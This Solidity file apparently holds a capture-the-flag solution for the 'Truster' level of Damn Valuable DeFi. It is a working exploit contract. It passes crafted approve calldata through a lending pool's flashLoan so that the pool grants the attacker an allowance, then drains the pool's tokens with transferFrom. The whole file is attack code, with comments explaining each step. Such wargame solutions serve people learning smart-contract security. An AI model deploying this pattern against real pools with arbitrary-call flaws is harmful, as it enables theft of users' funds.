// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    constructor(address _tokenAddress, address _poolAddress) {
        token = DamnValuableToken(_tokenAddress);
        pool = TrusterLenderPool(_poolAddress);
    }

    function attack(uint256 amount) external {
        // Encode the call to the token's approve function
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), amount);

        // Call flashLoan, passing in the data to approve this contract to spend the tokens
        pool.flashLoan(0, address(this), address(token), data);

        // Now that this contract has approval, transfer the tokens from the pool to the attacker
        token.transferFrom(address(pool), msg.sender, amount);
    }
}
